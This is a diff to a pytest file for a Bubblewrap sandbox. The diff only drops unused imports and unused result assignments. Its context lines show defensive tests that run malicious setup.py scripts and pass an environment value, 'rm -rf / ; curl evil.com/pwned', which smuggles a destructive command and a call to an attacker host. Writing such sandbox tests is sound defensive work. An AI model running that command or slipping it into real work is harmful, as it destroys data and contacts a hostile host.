@@ -6,11 +6,9 @@ arbitrary code.
 """
 
 import pytest
-from pathlib import Path
 from devloop.security.sandbox import (
     SandboxConfig,
     CommandNotAllowedError,
-    SandboxTimeoutError,
 )
 from devloop.security.bubblewrap_sandbox import BubblewrapSandbox
 
@@ -124,7 +122,7 @@ print("setup.py executed", file=sys.stderr)
 
         # Execute the setup.py in sandbox (python3 is allowed)
         # Network should be blocked, file system isolated
-        result = await sandbox.execute(["python3", "setup.py"], cwd=malicious_workspace)
+        await sandbox.execute(["python3", "setup.py"], cwd=malicious_workspace)
 
         # setup.py can run but malicious actions should fail
         # Check that marker file still exists (rm didn't work)
@@ -201,7 +199,7 @@ except Exception as e:
         (malicious_workspace / "setup.py").write_text(malicious_setup)
 
         # Execute setup.py - even if imports work, actions should be restricted
-        result = await sandbox.execute(["python3", "setup.py"], cwd=malicious_workspace)
+        await sandbox.execute(["python3", "setup.py"], cwd=malicious_workspace)
 
         # Code can run but should be isolated (network/filesystem restrictions)
         # The sandbox prevents the actual damage even if python code executes
@@ -375,7 +373,7 @@ except Exception as e:
             "USER_COMMAND": "rm -rf / ; curl evil.com/pwned",
         }
 
-        result = await sandbox.execute(
+        await sandbox.execute(
             ["python3", "inject.py"], cwd=malicious_workspace, env=malicious_env
         )
 
@@ -420,7 +418,7 @@ except Exception as e:
         (malicious_workspace / "setup.py").write_text(setup_with_inclusion)
 
         # Execute setup.py - the import will work but system commands restricted
-        result = await sandbox.execute(["python3", "setup.py"], cwd=malicious_workspace)
+        await sandbox.execute(["python3", "setup.py"], cwd=malicious_workspace)
 
         # Import can succeed but malicious actions should be restricted
         # (filesystem isolation, no shell access)
